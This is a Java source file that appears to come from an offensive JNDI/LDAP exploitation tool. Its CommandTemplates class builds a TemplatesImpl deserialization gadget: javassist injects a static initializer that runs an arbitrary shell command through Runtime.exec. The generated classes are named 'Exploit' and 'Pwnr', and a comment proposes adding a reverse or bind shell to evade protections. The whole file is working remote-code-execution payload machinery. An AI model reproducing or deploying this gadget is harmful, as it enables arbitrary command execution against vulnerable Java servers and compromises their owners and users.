package com.idiot9.ldap.templates;


import com.idiot9.ldap.gadgets.utils.ClassFiles;
import com.idiot9.ldap.gadgets.utils.Reflections;
import com.idiot9.ldap.utils.Cache;
import com.idiot9.ldap.utils.Util;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;

import javax.xml.transform.Templates;

public class CommandTemplates implements TemplateFactory {
    private Templates templates;
    private String cmd;
    private String className;
    private byte[] bytes;
//    final private Class tplClass = TemplatesImpl.class;
//    final private Class abstTranslet = AbstractTranslet.class;
//    final private Class transFactory = TransformerFactoryImpl.class;

    public CommandTemplates(String cmd) {
        this.cmd = cmd;
        this.className = "Exploit" + System.nanoTime();
        createTemplatesImpl();
    }

    public CommandTemplates(String cmd, String classname) {
        this.cmd = cmd;
        this.className = classname;
        createTemplatesImpl();
    }

    public Templates getTemplates() {
        return templates;
    }

    public String getClassName() {
        return className;
    }

    public byte[] getBytes() {
        return bytes;
    }

    public void cache() throws Exception {
        Cache.set(this.className, this.bytes);
    }

    @Override
    public void createTemplatesImpl(){
        try {
            Templates templates = (Templates) tplClass.newInstance();

            // use template gadget class
            ClassPool pool = ClassPool.getDefault();
            pool.insertClassPath(new ClassClassPath(TemplateFactory.StubTransletPayload.class));
            pool.insertClassPath(new ClassClassPath(abstTranslet));
            final CtClass clazz = pool.get(TemplateFactory.StubTransletPayload.class.getName());
            // run command in static initializer
            // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
            String command = "java.lang.Runtime.getRuntime().exec(\"" +
                    this.cmd.replace("\\", "\\\\").replace("\"", "\\\"") +
                    "\");";
            clazz.makeClassInitializer().insertAfter(command);
            // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
            clazz.setName(this.className);
            CtClass superC = pool.get(abstTranslet.getName());
            clazz.setSuperclass(superC);

            final byte[] classBytes = clazz.toBytecode();
            this.bytes = classBytes;

            // inject class bytes into instance
            Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                    classBytes, ClassFiles.classAsBytes(TemplateFactory.Foo.class)
            });

            // required to make TemplatesImpl happy
            Reflections.setFieldValue(templates, "_name", "Pwnr");
            Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());

            this.templates = templates;

        } catch (Exception e) {
            throw new RuntimeException(e);
        }

    }
}
